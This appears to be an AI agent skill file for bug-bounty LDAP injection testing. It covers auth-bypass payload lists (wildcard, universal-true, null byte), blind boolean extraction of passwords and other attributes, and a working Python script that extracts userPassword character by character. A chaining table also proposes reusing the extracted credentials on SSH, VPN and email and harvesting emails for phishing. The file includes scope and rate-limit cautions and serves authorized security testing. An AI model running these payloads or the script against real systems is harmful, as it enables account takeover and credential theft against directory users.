---
name: ldap
description: LDAP Injection — authentication bypass (wildcards, universal-true injection, null byte), blind boolean data exfiltration (character-by-character via attribute prefix matching), attribute enumeration, and filter syntax reference. Use when HauntMode flags LDAP injection as APPLIES/MAYBE, when the app authenticates against Active Directory or OpenLDAP, when login errors suggest LDAP processing, or when you need payloads and automation scripts for LDAP exploitation.
---

# LDAP Injection

This skill covers LDAP injection from detection through full data exfiltration: authentication bypass payloads (wildcard, universal-true, no-wildcard alternative), blind boolean character enumeration, attribute discovery, and scripted extraction. Read top to bottom on first invocation; jump to the section for follow-up work.

---

## 1. Triggers — when this skill applies

- App mentions Active Directory, LDAP, or OpenLDAP in error messages, login hints, or tech stack headers
- Login form backed by a corporate directory service (common in enterprise apps, VPNs, internal tooling)
- Error messages containing `ldap_bind`, `ldap_search`, `LDAP Error`, `DN`, `objectClass`
- Login that returns different errors for valid vs. invalid usernames (enumeration + boolean channel)
- App injecting user input directly into search filters without sanitization
- Any filter with observable `uid=`, `cn=`, `mail=`, `sAMAccountName=` structure in errors

---

---

## 3. LDAP filter syntax reference

### Basic filter syntax

| Filter | Meaning |
|---|---|
| `(attribute=value)` | Equality match |
| `(attribute=*value*)` | Substring match (wildcard) |
| `(attribute=*)` | Presence — attribute exists with any value |
| `(attribute>=value)` | Greater-or-equal |
| `(attribute<=value)` | Less-or-equal |
| `(attribute~=value)` | Approximate match |
| `(&(f1)(f2))` | Logical AND — both must match |
| `(\|(f1)(f2))` | Logical OR — either must match |
| `(!(f1))` | Logical NOT |
| `(&)` | Universal TRUE (always matches) |
| `(\|)` | Universal FALSE (never matches) |

### Wildcards

`*` matches zero or more characters anywhere in a value:
- `(uid=admin*)` — uid starts with "admin"
- `(uid=*admin*)` — uid contains "admin"
- `(uid=*)` — uid is present with any value

### Typical auth search filter

```ldap
(&(uid=admin)(userPassword=password123))
```

Both conditions must be true for the filter to match (return a user).

---

## 4. 30-second triage

Inject these in the username and password fields and observe the response:

```
username: *
password: *
→ If login succeeds → wildcard bypass confirmed

username: admin
password: *
→ If login succeeds → wildcard in password bypasses hash check

username: invalid' char
password: anything
→ If error message changes → LDAP filter injection possible
```

If you get "Login failed" for `username=test&password=invalidpassword` but "Login successful" for `username=admin&password=*`, LDAP injection is confirmed.

---

## 5. Authentication bypass — wildcard injection

The standard LDAP auth filter:
```ldap
(&(uid=INPUT_USER)(userPassword=INPUT_PASS))
```

**Wildcard password — known username:**
```
username: admin
password: *
```
Filter becomes:
```ldap
(&(uid=admin)(userPassword=*))
```
Matches all entries where `uid=admin` and `userPassword` has any value.

**Wildcard both fields — unknown username:**
```
username: *
password: *
```
Filter becomes:
```ldap
(&(uid=*)(userPassword=*))
```
Matches ALL users. You log in as the first one in the directory.

**Partial match — obfuscated admin username:**
```
username: admin*
password: *
```
Filter becomes:
```ldap
(&(uid=admin*)(userPassword=*))
```
Matches any user whose uid starts with "admin" — bypasses random-suffix obfuscation.

**Substring targeting:**
```
username: *admin*
password: *
```

---

## 6. Authentication bypass — no-wildcard (universal true injection)

Use when `*` is blacklisted or filtered.

Inject: `username=admin)(|(&` and `password=invalid)`:
```ldap
(&(uid=admin)(|(&)(userPassword=invalid)))
```

The `(&)` is the universal TRUE constant. The `or` clause evaluates `TRUE OR (password=invalid)` = TRUE. Authentication succeeds for `admin` without needing the correct password or a wildcard.

Variations:
```
username=admin)(|(userPassword=*)
password=abc
→ (&(uid=admin)(|(userPassword=*)(userPassword=abc)))

username=*)(|(uid=*)
password=*
→ (&(uid=*)(|(uid=*)(userPassword=*)))  — matches all users
```

---

## 7. Full payload list

Organized from simple to complex. Try in order:

```
# Simple wildcard
username=admin&password=*
username=*&password=*
username=admin*&password=*
username=*admin*&password=*
username=adm*&password=*

# Universal true (no wildcard)
username=admin)(|(&&password=abc
username=admin)(|(userPassword=*)&password=abc
username=admin)(|(|(uid=*))&password=abc
username=admin)(|(&(uid=admin)(userPassword=*))&password=abc

# Inject into uid to bypass auth
username=*)(userPassword=*)&password=abc
username=admin)(!(userPassword=abc))&password=abc
username=*)(!(userPassword=abc))&password=abc

# Pivot uid to admin via OR
username=*)(|(uid=*))(&password=*
username=*)(|(uid=admin))(&password=*

# Partial matches
username=adm*&password=*
username=administrator*&password=*
username=admin??&password=*    # ? matches one char in some LDAP implementations

# Empty password (null byte or blank)
username=admin&password=
username=*&password=
username=)(uid=admin)(&password=

# URL-encoded equivalents (use when form URL-encodes input)
username=admin%29%28%7C%28%26&password=abc
username=%2A&password=%2A
username=admin%2A&password=%2A
```

---

## 8. Data exfiltration — when results are displayed

If the app displays LDAP entry data to the user, inject a wildcard to dump all entries:

**Wildcard uid:**
```
username: *
```
Filter: `(&(uid=*)(objectClass=account))` → returns all accounts.

**Inject into an OR clause** to match everything:
```
objectClass=*
```
If the filter is `(|(objectClass=organization)(objectClass=INJECT))`, injecting `*` returns all entries.

---

## 9. Blind boolean LDAP injection

Use when the app returns different responses for success vs. failure (e.g., "Login successful but site is down" vs. "Login failed!") but does not display results.

**Principle:** Use wildcard prefix matching. Inject `(attribute=prefix*)` — if the entry's attribute starts with `prefix`, the filter matches (success response). Iterate character by character to extract the full value.

### Extract password character by character

Start with the first character:
```
username: htb-stdnt
password: a*     → fail
password: b*     → fail
...
password: p*     → SUCCESS  ← first char is 'p'
```

Then second character:
```
password: p@*    → SUCCESS  ← second char is '@'
password: pa*    → fail
```

Continue until the wildcard at the end no longer matches (the value ended):
```
password: p@ssw0rd    → SUCCESS (no wildcard) = exact match found
```

### Exfiltrate other attributes (description, mail, etc.)

Inject into username to target a different attribute while using the password field as the boolean channel:

```
username: admin)(|(description=prefix*
password: invalid)
```

Resulting filter:
```ldap
(&(uid=admin)(|(description=prefix*)(userPassword=invalid)))
```

The `or` clause returns true if `description` starts with `prefix`. Password is always wrong, so the only path to success is the description match.

This technique works for **any attribute**: `mail`, `cn`, `sn`, `telephoneNumber`, `memberOf`, `description`, etc.

### Discover which attributes exist

```
username: htb-stdnt)(|(attributeName=*
password: invalid)
```

If this returns "Login successful", the attribute `attributeName` exists on the `htb-stdnt` entry. Try common attributes:
- `description`, `mail`, `cn`, `sn`, `givenName`, `telephoneNumber`
- `memberOf`, `department`, `title`, `company`
- `userPassword`, `shadowLastChange`, `shadowExpire`
- `accountExpires`, `lastLogon`, `badPasswordTime`

---

## 10. Automation script — blind LDAP character extraction

Use this script to exfiltrate an attribute value character by character:

```python
#!/usr/bin/env python3
import requests, string, time

URL = "http://TARGET/index.php"
SUCCESS_MARKER = "temporarily down"   # adjust to match the success response
FAIL_MARKER = "Login failed!"
HEADERS = {"Content-Type": "application/x-www-form-urlencoded",
           "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"}
CHARSET = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_{}-@!-. "

def send_payload(username_injection):
    """Send raw body to avoid requests re-encoding special chars."""
    raw = f"username={username_injection}&password=invalid)"
    r = requests.post(URL, headers=HEADERS, data=raw, timeout=5)
    if SUCCESS_MARKER in r.text:
        return True
    elif FAIL_MARKER in r.text:
        return False
    print("[!] Unexpected response:", r.text[:100])
    return False

def extract_attribute(uid, attribute, maxlen=100):
    """Extract attribute value for a given uid."""
    found = ""
    for i in range(1, maxlen + 1):
        hit = False
        for c in CHARSET:
            # Inject: (&(uid=UID)(|(ATTR=<found><c>*)(userPassword=invalid)))
            inj = f"{uid})(|({attribute}={found}{c}*"
            if send_payload(inj):
                found += c
                print(f"  [+] Position {i}: {c} -> {found}")
                hit = True
                break
            time.sleep(0.05)
        if not hit:
            print(f"[!] Extraction complete. Full value: {found}")
            break
    return found

if __name__ == "__main__":
    # Extract password for admin
    result = extract_attribute("admin", "userPassword")
    print("[+] Extracted:", result)

    # Extract description for admin
    result = extract_attribute("admin", "description")
    print("[+] Description:", result)
```

**Note:** LDAP attribute values are typically case-insensitive. If extracting a password for re-use (e.g., it might be used elsewhere), you may need to brute-force the casing after extracting the lowercase version.

---

## 11. URL-encoded payloads

Some web forms or WAFs may require URL-encoded special characters. Key encodings:

| Character | URL-encoded |
|---|---|
| `*` | `%2A` |
| `(` | `%28` |
| `)` | `%29` |
| `\|` | `%7C` |
| `&` | `%26` |
| `=` | `%3D` |

Example:
```
username=%2A&password=%2A             ← * and *
username=admin%2A&password=%2A       ← admin* and *
username=admin%29%28%7C%28%26&password=abc   ← admin)(|(&
```

---

## 12. Bypass techniques

| Obstacle | Bypass |
|---|---|
| `*` blacklisted | Universal-true injection: `admin)(|(&` + `invalid)` |
| Both `*` and `(` blacklisted | Try `%2A` and `%28` URL-encoding |
| Username validated as alphanumeric | Inject into other fields (password, email) |
| Different LDAP attributes used (cn, sAMAccountName, mail) | Try `cn=admin*`, `sAMAccountName=admin*`, `mail=*@target.com` |
| OpenLDAP vs. Active Directory differences | AD uses `sAMAccountName`, OpenLDAP uses `uid` — adjust accordingly |
| Null byte injection | `username=admin\00` — may terminate the username field early |

---

## 13. False-positive checks

- **Wildcard login succeeds but it's a regex match, not LDAP:** Confirm by injecting `)(` — if an LDAP parsing error appears, it's genuine LDAP. If the app just accepts `*` as a valid password character, that's a different (still valid) bug.
- **Boolean channel unreliable:** Baseline several requests with a clearly non-existent user. Confirm that success vs. failure responses are consistent before scripting.
- **Attribute case sensitivity:** LDAP is generally case-insensitive for attribute values. If your extracted password doesn't work when authenticating, try uppercasing/lowercasing components.
- **Injection only in username, password is hashed:** If the password field is hashed server-side before LDAP query construction, wildcard in the password won't work because `hash("*") != "*"`. Focus on username-side injection only, or use the OR-clause technique.

---

## 14. Chain candidates

| Chain | Other skill | Impact uplift |
|---|---|---|
| LDAP auth bypass → admin session | `auth-bypass`, `idor` | Admin access without credentials |
| LDAP blind extraction → passwords for other services | `auth-bypass` | Credential reuse against SSH, VPN, email |
| LDAP data exfil → employee email list | `xss` (phishing), `auth-bypass` | Targeted credential harvesting |
| LDAP memberOf extraction → map privilege groups | `idor`, `auth-bypass` | Identify high-value accounts to target |
| LDAP injection in password reset (username field) | `auth-bypass` | ATO via reset flow LDAP injection |

---

## 15. Reporting template

```
POTENTIAL FINDING: LDAP Injection — <Authentication Bypass | Blind Data Exfiltration | Attribute Enumeration>
Target: <full URL / endpoint>
Parameter: <field name>
Evidence:
    <e.g., "username=admin&password=* → 302 redirect to /user.php (authenticated)" |
     "username=admin)(|(& + password=invalid) → login success response despite invalid creds" |
     "Blind exfil: description attribute extracted character-by-character via username=admin)(|(description=HTB* payload">
Working payload: <exact payload>
Data exfiltrated: <description, e.g., "admin password: p@ssw0rd, description field value">
Impact:
    <e.g., "Authentication bypass — access any account with a known username and wildcard password" |
     "Full AD user attribute exfiltration including password hashes / plaintext passwords stored in description field">
Chain potential: <other skills>
Next step: <e.g., "Extract passwords for all enumerated users via blind script", "Test extracted password on SSH/VPN/email", "Enumerate all users via uid=* wildcard in username field">
```

---

## 16. Recon tracker vector strings

Only log if the user explicitly authorizes (CLAUDE.md hard rule):

- `ldap:auth-bypass:wildcard` — wildcard `*` in password bypasses auth
- `ldap:auth-bypass:universal-true` — `admin)(|(&` injection bypasses auth
- `ldap:blind-boolean:<attribute>` — blind extraction confirmed on named attribute
- `ldap:exfil-display` — results displayed, wildcard dumps full directory
- `ldap:attr-enum:<attribute>` — confirmed existence of named attribute
- `ldap:no:<field>` — tested, not injectable (input sanitized)

---

## 17. What NOT to do

- **Do not enumerate all users in production with wildcard blasting** without rate-limit awareness. Each login attempt may be logged and trigger security alerts.
- **Do not extract real user passwords** beyond what is necessary to prove the vulnerability. Demonstrating that `admin`'s password is extractable (show first 3 chars) is sufficient — you don't need to extract all credentials.
- **Do not reuse extracted credentials on systems outside the program scope** — credential reuse testing is in-scope only if the program explicitly includes it.
- **Do not assume AD injection payloads work on OpenLDAP and vice versa** — attribute names differ (`sAMAccountName` vs. `uid`, `unicodePwd` vs. `userPassword`). Adjust based on observed error messages.
- **Do not run the blind extraction script at high speed** — add `time.sleep(0.05)` between requests minimum, and check `program-guidelines.txt` for rate limits before starting.
- **Do not auto-log to the recon tracker** without explicit user instruction (CLAUDE.md hard rule).
- **Do not rely on memory for filter syntax** — re-read the cheatsheet when constructing complex injection payloads.
